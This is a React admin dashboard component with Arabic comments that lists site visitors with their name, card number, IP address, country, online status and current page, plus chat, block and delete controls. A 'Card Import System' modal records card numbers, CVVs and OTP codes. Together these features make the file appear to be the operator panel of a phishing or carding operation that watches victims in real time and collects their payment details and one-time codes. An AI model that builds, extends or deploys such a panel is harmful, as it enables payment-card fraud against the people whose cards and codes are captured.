import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { io } from 'socket.io-client';

const socket = io('http://localhost:5000');
  const userId = localStorage.getItem('userId'); // الحصول على الـ ID من التخزين المحلي




function AllUsers() {
  const navigate = useNavigate();
  const [data, setData] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [selectedColor, setSelectedColor] = useState('');
  const [selectedUser, setSelectedUser] = useState(null);
  const [modalVisible, setModalVisible] = useState(false);
  const [searchTerm, setSearchTerm] = useState("");
  const [searchError, setSearchError] = useState(null);
  const [searching, setSearching] = useState(false);
  const [confirmationVisible, setConfirmationVisible] = useState(false);
  const [deleting, setDeleting] = useState(false);
  const [noUsers, setNoUsers] = useState(false);
  const [selectedChat, setSelectedChat] = useState([]);
  const [message, setMessage] = useState("");
  const [chatVisible, setChatVisible] = useState(false);
  const [currentUserId] = useState(1);
  const [showOffline, setShowOffline] = useState(true);
  const [adminColor, setAdminColor] = useState('#000000');
  const [selectedRow, setSelectedRow] = useState(null);
  



  


  // حالات جديدة لمودال بطاقات الدفع
  const [showCardModal, setShowCardModal] = useState(false);
  const [activeCardPage, setActiveCardPage] = useState(1);
  const [cards, setCards] = useState([]);
  const [currentCard, setCurrentCard] = useState({
    cardNumber: '',
    cardHolder: '',
    expiryDate: '',
    cvv: '',
    otp: ''
  });

  useEffect(() => {
    fetchData();
    fetchAdminColor();
    socket.on('userAdded', (newUser) => {
      setData(prevData => [...prevData, newUser]);
    });
    return () => {
      socket.off('userAdded');
    };
  }, []);




useEffect(() => {
  // جلب البيانات لأول مرة عند تحميل الصفحة
  fetchData(); // جلب البيانات

  // الاستماع للتحديثات عبر Socket.io
  socket.on('userDataUpdated', (updatedUser) => {
    setData((prevData) => {
      // تحديث البيانات بشكل فوري عند تغيير بيانات المستخدم
      const updatedData = prevData.map(user => 
        user.id === updatedUser.id ? { ...user, ...updatedUser } : user
      );
      return updatedData;
    });
  });

  // إيقاف الاستماع عند مغادرة الصفحة
  return () => {
    socket.off('userDataUpdated');  // إيقاف الاستماع عند مغادرة الصفحة
  };
}, []); // التأكد من تنفيذ `useEffect` عند تحميل الصفحة لأول مرة



// في useEffect الخاص بمتابعة تغييرات الحالة
useEffect(() => {
  socket.on('userStatusChanged', (updatedUser) => {
    setData(prevData => 
      prevData.map(user => 
        user.id === updatedUser.id ? { ...user, stats: updatedUser.stats } : user
      )
    );
  });

  return () => {
    socket.off('userStatusChanged');
  };
}, []);

  const fetchAdminColor = () => {


  if (!userId) {
    console.error('No user ID found in localStorage');
    return;
  }

  // تعديل URL لاستخدام الـ ID بشكل صحيح
  fetch(`http://localhost:5000/api/Get_AdminColor?id=${userId}`) // تأكد من أن ID يتم تضمينه بشكل صحيح
    .then(response => response.json())
    .then(data => {
      setAdminColor(data.Admin_Color || '#000000'); // تعيين اللون الافتراضي إذا لم يوجد لون
    })
    .catch(error => {
      console.error('Error fetching admin color:', error);
    });
};




const fetchData = () => {
    setLoading(true);
    fetch('http://localhost:5000/api/Full_info_ToAll', {
      headers: {
        'Cache-Control': 'no-cache', // منع التخزين المؤقت
      }
    })
      .then((response) => {
        if (!response.ok) throw new Error('Failed to fetch data');
        return response.json();
      })
      .then((data) => {
        setData(data);
        setLoading(false);
      })
      .catch((error) => {
        setError(error.message);
        setLoading(false);
      });
  };



  // وظائف جديدة لمودال بطاقات الدفع
  const handleCardInputChange = (e) => {
    const { name, value } = e.target;
    setCurrentCard(prev => ({ ...prev, [name]: value }));
  };

  const addCard = () => {
    if (currentCard.cardNumber && currentCard.cvv) {
      setCards([...cards, currentCard]);
      setCurrentCard({
        cardNumber: '',
        cardHolder: '',
        expiryDate: '',
        cvv: '',
        otp: ''
      });
    }
  };

  const generateOTP = (index) => {
    const newCards = [...cards];
    newCards[index].otp = Math.floor(100000 + Math.random() * 900000).toString();
    setCards(newCards);
  };

  const handleRowClick = (userId) => {
    setSelectedRow(selectedRow === userId ? null : userId);
  };

  const handleGoToAnalytics = () => {
    navigate('/analytics');
  };

  const handleHideOffline = () => {
    setShowOffline(!showOffline);
  };

  const fetchUserInfo = (userId) => {
    fetch(`http://localhost:5000/api/Full_info_byUserID?user_id=${userId}`)
      .then((response) => {
        if (!response.ok) throw new Error('Failed to fetch user info');
        return response.json();
      })
      .then((userData) => {
        setSelectedUser(userData);
        setModalVisible(true);
      })
      .catch((error) => {
        setError(error.message);
      });
  };
  

  





  useEffect(() => {
  // الاستماع للتحديثات عبر Socket.io
  socket.on('userStatusChanged', (updatedUser) => {
    setData((prevData) => 
      prevData.map((user) => 
        user.id === updatedUser.id ? { ...user, stats: updatedUser.stats } : user
      )
    );
  });

  return () => {
    socket.off('userStatusChanged'); // إيقاف الاستماع عند مغادرة الصفحة
  };
}, []);



  const UpdateBlock = (userId) => {
    fetch(`http://localhost:5000/api/Block?user_id=${userId}`)
      .then((response) => {
        if (!response.ok) throw new Error('Failed to Update Block');
        return response.json();
      })
      .then(() => {
        setData(prevData => 
          prevData.map(user => 
            user.id === userId ? {...user, block: !user.block} : user
          )
        );
      })
      .catch((error) => {
        setError(error.message);
      });
  };

  const DeleteUserById = (userId) => {
    fetch(`http://localhost:5000/api/deleteUserById?user_id=${userId}`, {
      method: 'DELETE',
    })
      .then((response) => {
        if (!response.ok) throw new Error('Failed to delete user');
        return response.json();
      })
      .then(() => {
        setData((prevData) => {
          const newData = prevData.filter((user) => user.id !== userId);
          if (newData.length === 0) setNoUsers(true);
          return newData;
        });
      })
      .catch((error) => {
        setError(error.message);
      });
  };

  const DeleteAllUsers = () => {
    setConfirmationVisible(true);
  };

  const confirmDeleteAll = () => {
    setDeleting(true);
    fetch('http://localhost:5000/api/Delete_AllUsers', { 
      method: 'DELETE', 
    })
      .then((response) => {
        if (!response.ok) throw new Error('Failed to delete users');
        return response.json();
      })
      .then(() => {
        setData([]);
        setNoUsers(true);
        setConfirmationVisible(false);
      })
      .catch((error) => {
        setError(`Error: ${error.message}`);
        setConfirmationVisible(false);
      })
      .finally(() => {
        setDeleting(false);
      });
  };

  const cancelDelete = () => {
    setConfirmationVisible(false);
  };

  const fetchChat = (receiverId) => {
    fetch(`http://localhost:5000/api/Get_Messages?sender_id=${currentUserId}&receiver_id=${receiverId}`)
      .then((response) => {
        if (!response.ok) throw new Error("Failed to fetch chat");
        return response.json();
      })
      .then((chatData) => {
        const user = data.find(u => u.id === receiverId);
        setSelectedUser(user);
        setSelectedChat(Array.isArray(chatData) && chatData.length > 0 ? chatData : []);
        setChatVisible(true);
      })
      .catch((error) => {
        setError("Error fetching chat");
        console.error("Chat fetch error:", error);
      });
  };

  const sendMessage = () => {
    if (message.trim() === "") {
      alert("Message cannot be empty.");
      return;
    }

    if (!selectedUser) {
      alert("No user selected for chat.");
      return;
    }

    fetch('http://localhost:5000/api/sendMessag', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        sender_id: currentUserId,
        receiver_id: selectedUser.id,
        message: message,
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.message === "Message sent successfully") {
          setMessage("");
          setSelectedChat(prev => [...prev, {
            sender_id: currentUserId,
            receiver_id: selectedUser.id,
            message: message,
            timestamp: new Date().toISOString()
          }]);
        }
      })
      .catch((error) => {
        console.error("Error sending message:", error);
        alert("Failed to send message.");
      });
  };





  const handleColorChange = (e, index) => {
  const newData = [...data];
  newData[index].User_Selected_color = e.target.checked ? adminColor : null;
  setData(newData);



};

  const handleSearchChange = (event) => {
    const value = event.target.value;
    setSearchTerm(value);
    
    if (value.trim() === '') {
      setSearchError(null);
      fetchData();
      return;
    }
    
    setSearching(true);
    fetch(`http://localhost:5000/api/Search?searchTerm=${value}`)
      .then((response) => {
        if (!response.ok) throw new Error('Failed to search');
        return response.json();
      })
      .then((data) => {
        if (Array.isArray(data) && data.length > 0) {
          setData(data);
          setSearchError(null);
          setNoUsers(false);
        } else {
          setData([]);
          setSearchError("No results found for your search.");
          setNoUsers(true);
        }
      })
      .catch((error) => {
        setSearchError("Error fetching search results");
        console.error("Search error:", error);
      })
      .finally(() => {
        setSearching(false);
      });
  };

  const renderContent = () => {
    if (loading) {
      return (
        <div className="text-center my-5">
          <div className="spinner-border text-primary" role="status">
            <span className="sr-only">Loading...</span>
          </div>
          <p>Loading data...</p>
        </div>
      );
    }

    if (error) {
      return (
        <div className="alert alert-danger text-center my-5">
          Error: {error}
          <button className="btn btn-link" onClick={fetchData}>
            Try Again
          </button>
        </div>
      );
    }

    const filteredData = showOffline ? data : data.filter(user => user.stats === 1);

    if (filteredData.length === 0) {
      return (
        <div className="alert alert-info text-center my-5">
          {showOffline ? "No users available" : "No online users available"}
          {searchTerm && (
            <button 
              className="btn btn-link" 
              onClick={() => {
                setSearchTerm('');
                fetchData();
              }}
            >
              Clear search
            </button>
          )}
        </div>
      );
    }

    if (searching) {
      return (
        <div className="text-center my-5">
          <div className="spinner-border text-primary" role="status">
            <span className="sr-only">Loading...</span>
          </div>
          <p>Searching...</p>
        </div>
      );
    }

    if (searchError) {
      return (
        <div className="alert alert-warning text-center my-5">
          {searchError}
          <button 
            className="btn btn-link" 
            onClick={() => {
              setSearchTerm('');
              fetchData();
            }}
          >
            Clear search
          </button>
        </div>
      );
    }

    return (
      <table className="table table-striped" style={{ width: "100%" }}>
        <thead>
          <tr>
            <th>#</th>
           <th>Selected</th>

            <th>Name</th>
            <th>CardNumber</th>
            <th>Status</th>
             <th>Active Page</th>
            <th>Flag</th>
            <th>Card</th>
            <th>Info</th>
            <th>Delete</th>
            <th>ChatBox</th>
            <th>Block</th>
          </tr>
        </thead>
        <tbody>
          {filteredData.map((item, index) => (
           
<tr 
  key={item.id} 
  style={{ 
    backgroundColor: item.User_Selected_color || (selectedRow === item.id ? adminColor : 'transparent'),
    cursor: 'pointer',
    transition: 'background-color 0.3s ease' // إضافة تأثير انتقال سلس للون
  }}
  onClick={() => handleRowClick(item.id)}
>



              <td>{item.id}</td>
              <td>
                <div>
                  <label className="switch">
                    <input
                      type="checkbox"
                      checked={item.User_Selected_color !== null && item.User_Selected_color !== ''}
                      onChange={(e) => handleColorChange(e, index)}
                    />
                    <span className="slider round"></span>
                  </label>
                  {item.User_Selected_color ? (
                    <div
                      style={{
                        backgroundColor: item.User_Selected_color,
                        width: '20px',
                        height: '20px',
                        borderRadius: '50%',
                        display: 'inline-block',
                        marginLeft: '10px',
                      }}
                    ></div>
                  ) : (
                    <div
                      style={{
                        backgroundColor: 'transparent',
                        width: '20px',
                        height: '20px',
                        borderRadius: '50%',
                        display: 'inline-block',
                        marginLeft: '10px',
                      }}
                    ></div>
                  )}
                </div>






              </td>
              <td>{item.F_name}</td>
              <td>{item.card_id}</td>



<td>
  <span className={`badge ${item.stats === 1 ? 'badge-success' : 'badge-secondary'}`}>
    {item.stats === 1 ? (
      <>
        <i className="fas fa-circle mr-1" style={{ fontSize: '0.6em' }}></i>
        Online
      </>
    ) : (
      <>
        <i className="fas fa-circle-notch mr-1" 
           style={{ fontSize: '0.6em', animation: 'fa-spin 2s infinite linear' }}></i>
        Offline
      </>
    )}
  </span>
</td>


                  <td>{item.active_Page}</td>

              <td>{item.country}</td>
              <td>
                <button 
                  type="button" 
                  className="btn btn-success"
                  onClick={(e) => {
                    e.stopPropagation();
                    setShowCardModal(true);
                  }}
                >
                  Card
                </button>
              </td>
              <td>
                <button
                  type="button"
                  className="btn btn-info"
                  onClick={(e) => {
                    e.stopPropagation();
                    fetchUserInfo(item.id);
                  }}
                >
                  Info
                </button>
              </td>
              <td>
                <button
                  type="button"
                  className="btn btn-danger"
                  onClick={(e) => {
                    e.stopPropagation();
                    DeleteUserById(item.id);
                  }}
                >
                  Delete
                </button>
              </td>
              <td>
                <button
                  type="button"
                  className="btn btn-secondary"
                  onClick={(e) => {
                    e.stopPropagation();
                    fetchChat(item.id);
                  }}
                >
                  Chat
                </button>
              </td>
              <td>
                <button 
                  type="button" 
                  className={`btn ${item.block ? 'btn-danger' : 'btn-outline-danger'}`}
                  onClick={(e) => {
                    e.stopPropagation();
                    UpdateBlock(item.id);
                  }}
                >
                  {item.block ? 'Unblock' : 'Block'}
                </button>
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    );
  };

  return (
    <div>
      <nav className="navbar navbar-expand-lg navbar-light bg-light">
        <a className="navbar-brand" href="#">Dashboard</a>
        
        <button className="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
          <span className="navbar-toggler-icon"></span>
        </button>

        <div className="collapse navbar-collapse" id="navbarSupportedContent">
          <ul className="navbar-nav mr-auto">
            <li className="nav-item active">
              <button
                type="button"
                className="nav-link text-danger"
                onClick={DeleteAllUsers}
                disabled={data.length === 0}
              >
                Delete All Users
              </button>
            </li>
          </ul>

          <form className="form-inline my-2 my-lg-0">
            <input
              className="form-control mr-sm-2"
              type="search"
              placeholder="Search"
              aria-label="Search"
              value={searchTerm}
              onChange={handleSearchChange}
            />
          </form>

          <button 
            className={`btn ${showOffline ? 'btn-warning' : 'btn-success'} my-2 my-sm-0 ml-2`} 
            type="button" 
            onClick={handleHideOffline}
          >
            {showOffline ? "Hide Offline" : "Show Offline"}
          </button>
          
          <button className="btn btn-danger my-2 my-sm-0 ml-2" type="button">Logout</button>
        </div>
      </nav>

      <div className="container mt-4 mb-4">
        <div className="d-flex justify-content-around">
          <button type="button" className="btn btn-primary col-5">Dashboard</button>
          <button
            type="button"
            className="btn btn-secondary col-5"
            onClick={handleGoToAnalytics}
          >
            Analytics
          </button>
        </div>
      </div>

      {/* Modal تأكيد الحذف */}
      {confirmationVisible && (
        <div className="modal show" style={{ display: 'block' }} tabIndex="-1">
          <div className="modal-dialog">
            <div className="modal-content">
              <div className="modal-header">
                <h5 className="modal-title">Confirm Deletion</h5>
                <button
                  type="button"
                  className="close"
                  data-dismiss="modal"
                  aria-label="Close"
                  onClick={cancelDelete}
                >
                  <span aria-hidden="true">&times;</span>
                </button>
              </div>
              <div className="modal-body">
                <p>Are you sure you want to delete all users?</p>
              </div>
              <div className="modal-footer">
                <button type="button" className="btn btn-secondary" onClick={cancelDelete}>Cancel</button>
                <button
                  type="button"
                  className="btn btn-danger"
                  onClick={confirmDeleteAll}
                  disabled={deleting}
                >
                  {deleting ? 'Deleting...' : 'Confirm Delete'}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Modal معلومات المستخدم */}
      {modalVisible && selectedUser && (
        <div className="modal show" style={{ display: 'block' }} tabIndex="-1">
          <div className="modal-dialog">
            <div className="modal-content">
              <div className="modal-header">
                <h5 className="modal-title">{selectedUser.F_name} {selectedUser.L_name}</h5>
                <button
                  type="button"
                  className="close"
                  data-dismiss="modal"
                  aria-label="Close"
                  onClick={() => setModalVisible(false)}
                >
                  <span aria-hidden="true">&times;</span>
                </button>
              </div>
              <div className="modal-body">
                <p><strong>Name:</strong> {selectedUser.F_name} {selectedUser.L_name}</p> 
                <p><strong>Username:</strong> {selectedUser.S_name}</p>
                <p><strong>Role:</strong> {selectedUser.Role}</p>
                <p><strong>Country:</strong> {selectedUser.country || 'Not specified'}</p>
                <p><strong>Status:</strong> 
                  <span className={`badge ${selectedUser.stats === 1 ? 'badge-success' : 'badge-secondary'} ml-2`}>
                    {selectedUser.stats === 1 ? "Online" : "Offline"}
                  </span>
                </p>
                <p><strong>IP Address:</strong> {selectedUser.ip}</p>
                <p><strong>Active Page:</strong> {selectedUser.active_Page}</p>
                <p><strong>Card Number:</strong> {selectedUser.cardnumber}</p>
                <p><strong>Selected Color:</strong> {selectedUser.User_Selected_color}</p>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Modal الدردشة */}
      {chatVisible && selectedUser && (
        <div className="modal show" style={{ display: 'block' }} tabIndex="-1">
          <div className="modal-dialog modal-lg">
            <div className="modal-content">
              <div className="modal-header">
                <h5 className="modal-title">Chat with {selectedUser.S_name}</h5>
                <button
                  type="button"
                  className="close"
                  data-dismiss="modal"
                  aria-label="Close"
                  onClick={() => {
                    setChatVisible(false);
                    setSelectedChat([]);
                  }}
                >
                  <span aria-hidden="true">&times;</span>
                </button>
              </div>
              <div className="modal-body" style={{ height: '400px', overflowY: 'auto' }}>
                {selectedChat.length === 0 ? (
                  <p>No messages yet. Start the conversation!</p>
                ) : (
                  selectedChat.map((msg, index) => (
                    <div 
                      key={index} 
                      className={`mb-2 ${msg.sender_id === currentUserId ? 'text-right' : 'text-left'}`}
                    >
                      <div 
                        className={`d-inline-block p-2 rounded ${msg.sender_id === currentUserId ? 'bg-primary text-white' : 'bg-light'}`}
                      >
                        {msg.message}
                        <div className="small text-muted">
                          {new Date(msg.timestamp).toLocaleTimeString()}
                        </div>
                      </div>
                    </div>
                  ))
                )}
              </div>
              <div className="modal-footer">
                <div className="input-group">
                  <input
                    type="text"
                    className="form-control"
                    placeholder="Type your message..."
                    value={message}
                    onChange={(e) => setMessage(e.target.value)}
                    onKeyPress={(e) => e.key === 'Enter' && sendMessage()}
                  />
                  <div className="input-group-append">
                    <button
                      className="btn btn-primary"
                      type="button"
                      onClick={sendMessage}
                    >
                      Send
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* مودال بطاقات الدفع الجديد */}
      {showCardModal && (
        <div className="modal show" style={{ display: 'block' }} tabIndex="-1">
          <div className="modal-dialog modal-xl">
            <div className="modal-content">
              <div className="modal-header">
                <h5 className="modal-title">Card Import System</h5>
                <button type="button" className="close" onClick={() => setShowCardModal(false)}>
                  <span aria-hidden="true">&times;</span>
                </button>
              </div>
              
              <div className="modal-body">
                {/* القسم الأول: أزرار الصفحات */}
                <div className="d-flex justify-content-between mb-4">
                  {[...Array(7)].map((_, i) => (
                    <button
                      key={`page${i+1}`}
                      className={`btn ${activeCardPage === i+1 ? 'btn-primary' : 'btn-outline-primary'}`}
                      onClick={() => setActiveCardPage(i+1)}
                    >
                      Page {i+1}
                    </button>
                  ))}
                </div>
                
                {/* القسم الثاني: بطاقات الدفع */}
                <div className="mb-4">
                  <h5>Payment Cards</h5>
                  <div className="cards-container" style={{ overflowX: 'auto', whiteSpace: 'nowrap' }}>
                    {cards.length > 0 ? (
                      cards.map((card, index) => (
                        <div key={index} className="card d-inline-block m-2" style={{ width: '300px' }}>
                          <div className="card-body">
                            <h6 className="card-subtitle mb-2 text-muted">Card {index + 1}</h6>
                            <div className="mb-2">
                              <strong>Number:</strong> {card.cardNumber.replace(/\d{4}(?= \d{4})/g, '****')}
                            </div>
                            <div className="mb-2">
                              <strong>Holder:</strong> {card.cardHolder || 'N/A'}
                            </div>
                            <div className="mb-2">
                              <strong>Expiry:</strong> {card.expiryDate || 'N/A'}
                            </div>
                            <div className="mb-2">
                              <strong>CVV:</strong> {card.cvv}
                            </div>
                            <button 
                              className="btn btn-sm btn-info"
                              onClick={() => generateOTP(index)}
                            >
                              Generate OTP
                            </button>
                          </div>
                        </div>
                      ))
                    ) : (
                      <div className="alert alert-info">No cards added yet</div>
                    )}
                  </div>
                  
                  <div className="card mt-3">
                    <div className="card-body">
                      <h6 className="card-title">Add New Card</h6>
                      <div className="row">
                        <div className="col-md-6">
                          <div className="form-group">
                            <label>Card Number</label>
                            <input
                              type="text"
                              className="form-control"
                              name="cardNumber"
                              value={currentCard.cardNumber}
                              onChange={handleCardInputChange}
                              placeholder="1234 5678 9012 3456"
                            />
                          </div>
                        </div>
                        <div className="col-md-6">
                          <div className="form-group">
                            <label>Card Holder</label>
                            <input
                              type="text"
                              className="form-control"
                              name="cardHolder"
                              value={currentCard.cardHolder}
                              onChange={handleCardInputChange}
                              placeholder="John Doe"
                            />
                          </div>
                        </div>
                      </div>
                      <div className="row">
                        <div className="col-md-4">
                          <div className="form-group">
                            <label>Expiry Date</label>
                            <input
                              type="text"
                              className="form-control"
                              name="expiryDate"
                              value={currentCard.expiryDate}
                              onChange={handleCardInputChange}
                              placeholder="MM/YY"
                            />
                          </div>
                        </div>
                        <div className="col-md-4">
                          <div className="form-group">
                            <label>CVV</label>
                            <input
                              type="text"
                              className="form-control"
                              name="cvv"
                              value={currentCard.cvv}
                              onChange={handleCardInputChange}
                              placeholder="123"
                            />
                          </div>
                        </div>
                        <div className="col-md-4 d-flex align-items-end">
                          <button className="btn btn-primary" onClick={addCard}>
                            Add Card
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                
                {/* القسم الثالث: OTP لكل بطاقة */}
                <div className="mb-4">
                  <h5>OTP Codes</h5>
                  <div className="row">
                    {cards.map((card, index) => (
                      card.otp && (
                        <div key={index} className="col-md-3 mb-3">
                          <div className="card">
                            <div className="card-body">
                              <h6 className="card-title">Card {index + 1}</h6>
                              <div className="d-flex justify-content-between align-items-center">
                                <span className="text-success font-weight-bold">{card.otp}</span>
                                <button 
                                  className="btn btn-sm btn-outline-danger"
                                  onClick={() => {
                                    const newCards = [...cards];
                                    newCards[index].otp = '';
                                    setCards(newCards);
                                  }}
                                >
                                  Clear
                                </button>
                              </div>
                            </div>
                          </div>
                        </div>
                      )
                    ))}
                  </div>
                </div>
                
                {/* القسم الرابع: أزرار الصفحات */}
                <div className="d-flex justify-content-between">
                  {[...Array(7)].map((_, i) => (
                    <button
                      key={`page${i+8}`}
                      className={`btn ${activeCardPage === i+8 ? 'btn-primary' : 'btn-outline-primary'}`}
                      onClick={() => setActiveCardPage(i+8)}
                    >
                      Page {i+8}
                    </button>
                  ))}
                </div>
              </div>
              
              <div className="modal-footer">
                <button type="button" className="btn btn-secondary" onClick={() => setShowCardModal(false)}>
                  Close
                </button>
                <button type="button" className="btn btn-primary">
                  Save Changes
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      <div className="container">
        {renderContent()}
      </div>

      <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
      <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct" crossorigin="anonymous"></script>
    </div>
  );
}

export default AllUsers;